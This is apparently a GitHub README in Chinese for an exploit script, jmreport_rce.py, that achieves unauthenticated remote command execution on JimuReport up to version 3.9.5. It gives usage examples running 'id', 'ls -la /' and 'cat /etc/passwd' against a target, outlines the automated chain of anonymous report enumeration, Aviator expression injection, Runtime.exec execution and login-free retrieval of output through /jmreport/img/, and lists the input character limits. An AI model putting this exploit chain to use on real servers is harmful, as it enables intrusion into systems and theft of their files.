# jmreport3.9.5Rce
积木报表&lt;=3.9.5 RCE利用


```
用法:
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "id"
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "cat /etc/passwd"
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "ls -la /"

流程(全自动):
  匿名枚举报表 -> 探测哪个报表会执行 Aviator 参数 -> Step1 引擎改造 x2
  -> Step2 Runtime.exec 执行命令,输出写到上传目录 -> 免登录 GET /jmreport/img/ 拉回回显

命令限制(传输层特性,必须遵守,脚本会校验):
  不允许 ; | & + = % 和单引号 ';多段命令请拆成多条依次执行
  例: id | grep root  → 分两次: "id"  + 单独再跑一次
```

<img width="1936" height="432" alt="cca2ec412e19d0daf93886c0caa9ddee" src="https://github.com/user-attachments/assets/52c462b9-08ae-428e-8e0b-b7d30e4220ac" />
<img width="1936" height="448" alt="070785a2f0ef96f238518ff30ac16061" src="https://github.com/user-attachments/assets/11fc8c29-42e9-4531-b5a1-507103d16211" />


